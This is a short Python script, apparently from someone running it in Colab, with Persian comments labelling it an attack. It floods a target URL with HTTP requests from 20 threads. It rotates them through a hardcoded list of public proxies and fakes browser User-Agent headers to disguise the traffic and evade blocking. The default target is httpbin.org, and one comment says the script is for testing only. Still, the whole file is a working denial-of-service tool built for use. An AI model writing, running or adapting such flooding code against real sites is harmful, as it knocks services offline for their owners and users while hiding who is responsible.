import requests
import random
import time
import threading
from itertools import cycle

# تنظیمات
target_url = "http://httpbin.org/get"  # فقط برای تست! عوض کن به URL تست خودت
num_requests = 2000  # تعداد درخواست‌ها
delay = 0.002  # تأخیر کم برای سرعت بیشتر
num_threads = 20  # تعداد رشته‌ها برای استفاده از منابع Colab

# لیست پروکسی‌ها (بعد از چک کردن با proxy_checker.py پر کن)
proxies = [
    "http://103.149.162.195:80",
    "http://154.202.108.231:3128",
    "http://51.159.115.233:3128",
    "http://162.240.75.37:80",
]
proxy_pool = cycle(proxies)

# تابع حمله با پروکسی
def http_flood():
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]),
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }
    print(f"شروع حمله به {target_url} با پروکسی...")
    for _ in range(num_requests):
        proxy = next(proxy_pool)
        try:
            response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=5)
            print(f"درخواست با پروکسی {proxy} فرستاده شد! کد پاسخ: {response.status_code}")
        except:
            print(f"خطا با پروکسی {proxy}!")
        time.sleep(delay)

# اجرای چندنخی
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=http_flood)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print("حمله تموم شد!")
